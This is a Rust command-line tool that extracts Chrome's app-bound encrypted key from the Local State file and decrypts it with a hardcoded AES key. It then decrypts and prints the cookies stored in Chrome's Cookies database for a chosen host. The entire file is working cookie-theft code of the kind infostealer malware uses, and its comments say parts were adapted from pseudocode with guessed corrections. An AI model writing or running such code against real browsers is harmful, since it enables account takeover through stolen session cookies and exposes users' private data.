use std::path::PathBuf;
use clap::{Parser, Subcommand};
use serde::Deserialize;
use anyhow::{anyhow, Context, Result};
use base64::{Engine as _, engine::general_purpose};
use aes_gcm::{
    aead::{Aead, KeyInit},
    Aes256Gcm, Nonce,
};
use rusqlite::{Connection, params};

#[derive(Parser)]
#[command(author, version, about, long_about = None)]
struct Cli {
    #[command(subcommand)]
    command: Commands,
}

#[derive(Subcommand)]
enum Commands {
    /// Extracts the base64-encoded encrypted key from the Local State file.
    ExtractKey {
        /// Path to the Chrome 'Local State' file.
        #[arg(short, long)]
        local_state_path: PathBuf,
    },
    /// Decrypts the intermediate key using the hardcoded AES key.
    DecryptKey {
        /// The base64-encoded, DPAPI-decrypted key.
        #[arg(long)]
        decrypted_key: String,
    },
    /// Decrypts cookies from the cookie database.
    DecryptCookies {
        /// The final, decrypted base64-encoded key.
        #[arg(long)]
        key: String,
        /// Path to the 'Cookies' database file.
        #[arg(long)]
        cookie_db_path: PathBuf,
        /// Hostname to filter cookies for (e.g., "google.com").
        #[arg(long)]
        host: String,
    },
}

#[derive(Deserialize)]
struct LocalState {
    os_crypt: OsCrypt,
}

#[derive(Deserialize)]
struct OsCrypt {
    app_bound_encrypted_key: String,
}

fn main() -> Result<()> {
    let cli = Cli::parse();

    match &cli.command {
        Commands::ExtractKey { local_state_path } => {
            let local_state_content = std::fs::read_to_string(local_state_path)
                .context("Failed to read Local State file")?;
            let local_state: LocalState = serde_json::from_str(&local_state_content)
                .context("Failed to parse Local State JSON")?;

            println!("{}", local_state.os_crypt.app_bound_encrypted_key);
        }
        Commands::DecryptKey { decrypted_key } => {
            let encrypted_key_bytes = general_purpose::STANDARD.decode(decrypted_key)
                .context("Failed to decode base64 for decrypted_key")?;

            // As per the pseudocode
            let iv = &encrypted_key_bytes[1..1+12];
            let ciphertext = &encrypted_key_bytes[1+12..1+12+32];
            let tag = &encrypted_key_bytes[1+12+32..];

            let aes_key_b64 = "sxxuJBrIRnKNqcH6xJNmUc/7lE0UOrgWJ2vMbaAoR4c=";
            let aes_key = general_purpose::STANDARD.decode(aes_key_b64)
                .context("Failed to decode hardcoded AES key")?;

            let cipher = Aes256Gcm::new_from_slice(&aes_key)
                .map_err(|e| anyhow!("Failed to create AES-GCM cipher: {}", e))?;
            let nonce = Nonce::from_slice(iv);

            let mut buffer = Vec::new();
            buffer.extend_from_slice(ciphertext);
            buffer.extend_from_slice(tag);

            let final_key = cipher.decrypt(nonce, buffer.as_ref())
                .map_err(|e| anyhow!("Failed to decrypt key: {}", e))?;

            println!("{}", general_purpose::STANDARD.encode(&final_key));
        }
        Commands::DecryptCookies { key, cookie_db_path, host } => {
            let key_bytes = general_purpose::STANDARD.decode(key)
                .context("Failed to decode base64 for key")?;
            let cipher = Aes256Gcm::new_from_slice(&key_bytes)
                .map_err(|e| anyhow!("Failed to create AES-GCM cipher for cookies: {}", e))?;

            let conn = Connection::open(cookie_db_path)
                .context("Failed to open cookie database")?;

            let mut stmt = conn.prepare("SELECT name, encrypted_value FROM cookies WHERE host_key LIKE ?")
                .context("Failed to prepare SQL statement")?;

            let host_filter = format!("%{}%", host);
            let mut rows = stmt.query(params![host_filter])
                .context("Failed to query cookies")?;

            while let Some(row) = rows.next()? {
                let name: String = row.get(0)?;
                let encrypted_value: Vec<u8> = row.get(1)?;

                if encrypted_value.starts_with(b"v10") || encrypted_value.starts_with(b"v11") {
                    // v20 seems to be a typo in the original pseudocode, it should be v10/v11
                    let iv = &encrypted_value[3..3+12];
                    let ciphertext_and_tag = &encrypted_value[3+12..];

                    let nonce = Nonce::from_slice(iv);
                    if let Ok(decrypted_cookie) = cipher.decrypt(nonce, ciphertext_and_tag) {
                         // The pseudocode has `decrypted_cookie[32:]` which seems to be an error
                         // The actual cookie value starts right after decryption.
                         // Let's try to decode it as utf-8
                        if let Ok(value) = String::from_utf8(decrypted_cookie) {
                            println!("{} = {}", name, value);
                        } else {
                            println!("{} = [non-utf8 value]", name);
                        }
                    } else {
                        println!("{} = [DECRYPTION FAILED]", name);
                    }
                } else {
                     // For non-encrypted cookies or other formats
                    if let Ok(value) = String::from_utf8(encrypted_value.clone()) {
                        println!("{} = {} (unencrypted)", name, value);
                    }
                }
            }
        }
    }

    Ok(())
}